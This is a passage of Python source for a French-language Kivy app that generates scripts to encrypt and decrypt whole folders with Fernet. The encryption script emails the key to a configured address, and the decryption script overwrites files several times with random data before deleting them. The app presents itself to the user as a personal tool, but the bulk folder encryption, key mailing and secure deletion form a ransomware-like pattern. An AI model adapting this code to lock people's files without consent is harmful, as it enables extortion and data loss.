    lines.append("            _warn(root, 'Dossiers introuvables', nl.join('- ' + f for f in folders_missing))")
    lines.append("        if not folders_ok:")
    lines.append("            _error(root, 'Erreur', 'Aucun dossier valide.' + nl + nl.join(TARGET_FOLDERS))")
    lines.append("            root.destroy()")
    lines.append("            return")
    lines.append("        for folder in folders_ok:")
    lines.append("            encrypt_folder(folder, cipher)")
    lines.append("        if not encrypted_files:")
    lines.append("            _info(root, 'Info', 'Aucun fichier a chiffrer (deja .enc ?).')")
    lines.append("            root.destroy()")
    lines.append("            return")
    lines.append("        nb = str(len(encrypted_files))")
    lines.append("        if mail_ok:")
    lines.append("            try_send_mail(key, extra_pwd=epw)")
    lines.append("            msg = nb + ' fichier(s) chiffre(s).' + nl*2 + 'Cle Fernet envoyee par mail a ' + RECEIVER_EMAIL")
    lines.append("            if epw: msg += nl + 'Mot de passe optionnel aussi dans le mail.'")
    lines.append("            _info(root, 'Succes', msg)")
    lines.append("        elif mode == 'fernet_from_pwd':")
    lines.append("            _warn(root, 'Succes - mail echoue', nb + ' fichier(s) chiffre(s).' + nl + 'Dechiffrez avec votre mot de passe optionnel.')")
    lines.append("        else:")
    lines.append("            _info(root, 'Succes - mode secours', nb + ' fichier(s) chiffre(s).' + nl + 'Dechiffrez avec votre mot de passe de secours.')")
    lines.append("        root.destroy()")
    lines.append("    def _safe_run():")
    lines.append("        try:")
    lines.append("            _run()")
    lines.append("        except Exception as e:")
    lines.append("            try:")
    lines.append("                import pathlib")
    lines.append("                pathlib.Path('/sdcard/encrypt_error.log').write_text(")
    lines.append("                    traceback.format_exc(), encoding='utf-8')")
    lines.append("            except Exception: pass")
    lines.append("            _error(root, 'Erreur', str(e) + nl*2 + traceback.format_exc()[:600])")
    lines.append("            root.destroy()")
    lines.append("    root.after(100, _safe_run)")
    lines.append("    root.mainloop()")
    lines.append("")
    lines.append("if __name__ == '__main__':")
    lines.append("    main()")
    return "\n".join(lines)


def _build_decrypt(folders_repr):
    lines = []
    lines.append("import os")
    lines.append("import base64")
    lines.append("import hashlib")
    lines.append("import tkinter as tk")
    lines.append("from cryptography.fernet import Fernet, InvalidToken")
    lines.append("")
    lines.append(f"TARGET_FOLDERS = [os.path.expandvars(os.path.expanduser(f)) for f in {folders_repr}]")
    lines.append("decrypted_files = []")
    lines.append("failed_files    = []")
    lines.append("")
    lines.append("class _Dlg(tk.Toplevel):")
    lines.append("    def __init__(self, parent, title, msg, fg='#cdd6f4', btn='#89b4fa'):")
    lines.append("        super().__init__(parent)")
    lines.append("        self.title(title)")
    lines.append("        self.configure(bg='#1e1e2e')")
    lines.append("        self.resizable(True, True)")
    lines.append("        sw = self.winfo_screenwidth() or 480")
    lines.append("        sh = self.winfo_screenheight() or 800")
    lines.append("        w = min(sw, 460)")
    lines.append("        h = sh")
    lines.append("        self.geometry(f'{w}x{h}+{(sw-w)//2}+0')")
    lines.append("        tk.Label(self, text=title, bg='#1e1e2e', fg='#89b4fa',")
    lines.append("                 font=('Helvetica', 13, 'bold')).pack(pady=(16, 4))")
    lines.append("        fr = tk.Frame(self, bg='#313244')")
    lines.append("        fr.pack(fill='both', expand=True, padx=12, pady=4)")
    lines.append("        sb = tk.Scrollbar(fr); sb.pack(side='right', fill='y')")
    lines.append("        t = tk.Text(fr, wrap='word', bg='#313244', fg=fg,")
    lines.append("                    font=('Helvetica', 12), relief='flat', bd=6,")
    lines.append("                    yscrollcommand=sb.set)")
    lines.append("        t.pack(fill='both', expand=True)")
    lines.append("        sb.config(command=t.yview)")
    lines.append("        t.insert('1.0', msg)")
    lines.append("        t.config(state='disabled')")
    lines.append("        tk.Button(self, text='OK', command=self.destroy,")
    lines.append("                  bg=btn, fg='#1e1e2e', font=('Helvetica', 13, 'bold'),")
    lines.append("                  relief='flat', pady=12).pack(pady=10, fill='x', padx=12)")
    lines.append("        self.grab_set()")
    lines.append("        self.wait_window()")
    lines.append("")
    lines.append("class _Input(tk.Toplevel):")
    lines.append("    def __init__(self, parent, title, prompt, show='*'):")
    lines.append("        super().__init__(parent)")
    lines.append("        self.title(title)")
    lines.append("        self.configure(bg='#1e1e2e')")
    lines.append("        self.result = None")
    lines.append("        sw = self.winfo_screenwidth() or 480")
    lines.append("        sh = self.winfo_screenheight() or 800")
    lines.append("        w = min(sw, 460)")
    lines.append("        h = sh")
    lines.append("        self.geometry(f'{w}x{h}+{(sw-w)//2}+0')")
    lines.append("        tk.Label(self, text=prompt, bg='#1e1e2e', fg='#cdd6f4',")
    lines.append("                 font=('Helvetica', 13), wraplength=w-30,")
    lines.append("                 justify='left').pack(padx=16, pady=(20, 8), anchor='w')")
    lines.append("        self._v = tk.StringVar()")
    lines.append("        e = tk.Entry(self, textvariable=self._v, show=show,")
    lines.append("                     bg='#313244', fg='#cdd6f4', insertbackground='#cdd6f4',")
    lines.append("                     font=('Courier', 16), relief='flat', bd=8)")
    lines.append("        e.pack(fill='x', padx=16, pady=(0, 16), ipady=10)")
    lines.append("        e.bind('<Return>', self._ok)")
    lines.append("        self.after(200, lambda: e.focus_force())")
    lines.append("        def _paste():")
    lines.append("            try:")
    lines.append("                txt = self.clipboard_get()")
    lines.append("                for bad in [chr(c) for c in [8208,8209,8210,8211,8212,8213]]:")
    lines.append("                    txt = txt.replace(bad, '-')")
    lines.append("                VALID = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=_-'")
    lines.append("                self._v.set(''.join(c for c in txt if c in VALID))")
    lines.append("            except Exception: pass")
    lines.append("        tk.Button(self, text='Coller depuis presse-papier', command=_paste,")
    lines.append("                  bg='#585b70', fg='#cdd6f4', font=('Helvetica', 12),")
    lines.append("                  relief='flat', pady=8).pack(fill='x', padx=16, pady=(0,8))")
    lines.append("        row = tk.Frame(self, bg='#1e1e2e')")
    lines.append("        row.pack(fill='x', padx=16, pady=(0, 16))")
    lines.append("        tk.Button(row, text='OK', command=self._ok,")
    lines.append("                  bg='#a6e3a1', fg='#1e1e2e', font=('Helvetica', 14, 'bold'),")
    lines.append("                  relief='flat', pady=14).pack(fill='x', pady=(0,8))")
    lines.append("        tk.Button(row, text='Annuler', command=self.destroy,")
    lines.append("                  bg='#f38ba8', fg='#1e1e2e', font=('Helvetica', 14),")
    lines.append("                  relief='flat', pady=14).pack(fill='x')")
    lines.append("        self.grab_set()")
    lines.append("        self.wait_window()")
    lines.append("    def _ok(self, e=None):")
    lines.append("        self.result = self._v.get()")
    lines.append("        self.destroy()")
    lines.append("")
    lines.append("def _info(r, t, m):  _Dlg(r, t, m, fg='#a6e3a1', btn='#a6e3a1')")
    lines.append("def _warn(r, t, m):  _Dlg(r, t, m, fg='#f9e2af', btn='#f9e2af')")
    lines.append("def _error(r, t, m): _Dlg(r, t, m, fg='#f38ba8', btn='#f38ba8')")
    lines.append("def _ask(r, t, p, show='*'):")
    lines.append("    d = _Input(r, t, p, show=show)")
    lines.append("    return d.result")
    lines.append("")
    lines.append("def make_cipher_from_password(password):")
    lines.append("    key = base64.urlsafe_b64encode(hashlib.sha256(password.encode()).digest())")
    lines.append("    return Fernet(key)")
    lines.append("")
    lines.append("def secure_delete(path, passes=3):")
    lines.append("    try:")
    lines.append("        if not os.path.isfile(path): return")
    lines.append("        length = os.path.getsize(path)")
    lines.append("        with open(path, 'r+b') as f:")
    lines.append("            for _ in range(passes):")
    lines.append("                f.seek(0)")
    lines.append("                f.write(os.urandom(length))")
    lines.append("                f.flush()")
    lines.append("                os.fsync(f.fileno())")
    lines.append("        os.remove(path)")
    lines.append("    except Exception: pass")
    lines.append("")
    lines.append("def decrypt_file(filepath, cipher):")
    lines.append("    global decrypted_files, failed_files")
    lines.append("    if not filepath.endswith('.enc'): return")
    lines.append("    original = filepath[:-4]")
    lines.append("    try:")
    lines.append("        with open(filepath, 'rb') as f: data = f.read()")
    lines.append("        dec = cipher.decrypt(data)")
    lines.append("        with open(original, 'wb') as f: f.write(dec)")
    lines.append("        if os.path.exists(original):")
    lines.append("            secure_delete(filepath)")
    lines.append("            decrypted_files.append(original)")
    lines.append("    except InvalidToken: failed_files.append(filepath)")
    lines.append("    except Exception:    failed_files.append(filepath)")
    lines.append("")
    lines.append("def decrypt_folder(folder, cipher):")
    lines.append("    for root, dirs, files in os.walk(folder):")
    lines.append("        for filename in files:")
    lines.append("            decrypt_file(os.path.join(root, filename), cipher)")
    lines.append("")
    lines.append("def main():")
    lines.append("    import traceback")
    lines.append("    nl = chr(10)")
    lines.append("    root = tk.Tk()")
    lines.append("    root.title('')")
    lines.append("    root.geometry('1x1+0+0')")
    lines.append("    root.resizable(False, False)")
    lines.append("    def _run():")
    lines.append("        choice = _ask(root, 'Mode de dechiffrement',")
    lines.append("                      'Entrez votre mot de passe' + nl +")
    lines.append("                      '(laissez vide pour utiliser une cle Fernet)', show='*')")
    lines.append("        if choice is None:")
    lines.append("            root.destroy(); return")
    lines.append("        if choice.strip():")
    lines.append("            cipher = make_cipher_from_password(choice.strip())")
    lines.append("        else:")
    lines.append("            key_input = _ask(root, 'Cle Fernet',")
    lines.append("                             'Collez votre cle Fernet' + nl +")
    lines.append("                             'ou entrez le chemin du fichier .key', show='')")
    lines.append("            if not key_input:")
    lines.append("                root.destroy(); return")
    lines.append("            key_input = key_input.strip()")
    lines.append("            if os.path.isfile(key_input):")
    lines.append("                try:")
    lines.append("                    with open(key_input, 'rb') as f: raw = f.read().decode('utf-8', errors='ignore')")
    lines.append("                    def _ck(s):")
    lines.append("                        for bad in [chr(c) for c in [8208,8209,8210,8211,8212,8213]]:")
    lines.append("                            s = s.replace(bad, '-')")
    lines.append("                        VALID = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=_-'")
    lines.append("                        return ''.join(c for c in s if c in VALID)")
    lines.append("                    cipher = Fernet(_ck(raw).encode())")
    lines.append("                except Exception as e:")
    lines.append("                    _error(root, 'Erreur fichier', str(e))")
    lines.append("                    root.destroy(); return")
    lines.append("            else:")
    lines.append("                def _ck(s):")
    lines.append("                    for bad in [chr(c) for c in [8208,8209,8210,8211,8212,8213]]:")
    lines.append("                        s = s.replace(bad, '-')")
    lines.append("                    VALID = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=_-'")
    lines.append("                    return ''.join(c for c in s if c in VALID)")
    lines.append("                try:")
    lines.append("                    cipher = Fernet(_ck(key_input).encode())")
    lines.append("                except Exception as e:")
    lines.append("                    _error(root, 'Cle invalide', 'Cle Fernet invalide :' + nl + str(e) + nl + 'Verifiez quelle est copiee en entier.')")
    lines.append("                    root.destroy(); return")
    lines.append("        folders_ok, folders_missing = [], []")
    lines.append("        for folder in TARGET_FOLDERS:")
    lines.append("            (folders_ok if os.path.isdir(folder) else folders_missing).append(folder)")
    lines.append("        if folders_missing:")
    lines.append("            _warn(root, 'Dossiers introuvables', nl.join('- ' + f for f in folders_missing))")
    lines.append("        if not folders_ok:")
    lines.append("            _error(root, 'Erreur', 'Aucun dossier valide.' + nl + nl.join(TARGET_FOLDERS))")
    lines.append("            root.destroy(); return")
    lines.append("        for folder in folders_ok:")
    lines.append("            decrypt_folder(folder, cipher)")
    lines.append("        nb_ok  = str(len(decrypted_files))")
    lines.append("        nb_err = str(len(failed_files))")
    lines.append("        if not decrypted_files and not failed_files:")
    lines.append("            _info(root, 'Info', 'Aucun fichier .enc trouve.')")
    lines.append("        elif failed_files:")
    lines.append("            _warn(root, 'Termine', nb_ok + ' fichier(s) dechiffre(s).' + nl + nb_err + ' echec(s) (mauvaise cle ?).')")
    lines.append("        else:")
    lines.append("            _info(root, 'Succes', nb_ok + ' fichier(s) dechiffre(s).')")
    lines.append("        root.destroy()")
    lines.append("    def _safe_run():")
    lines.append("        try:")
    lines.append("            _run()")
    lines.append("        except Exception as e:")
    lines.append("            try:")
    lines.append("                import pathlib")
    lines.append("                pathlib.Path('/sdcard/decrypt_error.log').write_text(")
    lines.append("                    traceback.format_exc(), encoding='utf-8')")
    lines.append("            except Exception: pass")
    lines.append("            _error(root, 'Erreur', str(e) + nl*2 + traceback.format_exc()[:600])")
    lines.append("            root.destroy()")
    lines.append("    root.after(100, _safe_run)")
    lines.append("    root.mainloop()")
    lines.append("")
    lines.append("if __name__ == '__main__':")
    lines.append("    main()")
    return "\n".join(lines)


# ── App principale ────────────────────────────────────────────────────────────

class ChiffrementApp(App):
    def build(self):
        sm = ScreenManager()
        sm.add_widget(MainScreen(name='main'))

        enc = EncryptScreen(name='encrypt')
        dec = DecryptScreen(name='decrypt')
        cfg = ConfigScreen(name='config')

        # Ajouter bouton retour
        for scr in [enc, dec, cfg]:
            back = Button(
                text='← Retour', background_color=MUTED, color=TEXT,
                bold=True, font_size=dp(13), size_hint=(None, None),
                size=(dp(110), dp(40)), background_normal='')
            back.bind(on_press=lambda *a: setattr(sm, 'current', 'main'))
            scr.add_widget(back)

        sm.add_widget(enc)
        sm.add_widget(dec)
        sm.add_widget(cfg)
        return sm


if __name__ == '__main__':
    ChiffrementApp().run()
